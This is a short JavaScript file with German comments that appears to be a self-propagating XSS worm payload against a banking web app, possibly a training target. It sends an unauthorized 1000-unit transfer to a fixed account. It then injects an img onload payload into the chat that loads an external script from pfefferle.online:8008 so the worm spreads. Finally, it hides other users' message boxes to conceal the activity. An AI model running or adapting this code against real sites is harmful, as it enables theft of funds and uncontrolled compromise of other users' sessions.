// Überweisung ausführen
(function(){ // anonyme, selbstausführende Funktion
    var x = new XMLHttpRequest();
    x.open('POST', '/banking/?page=transfer2');
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.send('account=8030098&amount=1000&intended_use=&receiver=');
})();


// sich selbst in den Chat schreiben
(function(){ // anonyme, selbstausführende Funktion
    4242var x = new XMLHttpRequest();
    var payload =  "4242\\u003cimg src=\\u0022data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\\u0022 onload=\\u0022script = document.createElement('script');script.src ='http://pfefferle.online:8008/f.js';document.head.appendChild(script);\\u0022\\u003e";
    x.open('POST', '/banking/?page=chat');
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.send('name=&message=' + encodeURIComponent(payload) + '&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden');
})();

// hide boxes
(function(){ // anonyme, selbstausführende Funktion
    var btns = document.getElementsByClassName("closebtn");
    for (var i = 0; i < btns.length; i++) {
        var div=btns[i].parentNode.getElementsByTagName('div');
        if (div[0].innerText != '4242'){ // then click hide box
            var x = new XMLHttpRequest();
            x.open('GET', btns[i].href);
            x.send();
            //    btns[i].href //full url
            //    btns[i].getAttribute('href') //without base
        }
    }
})();

// inj -> chat -> memo -> läd bei aufruf ext script -> inj -> chat -> memo -> läd
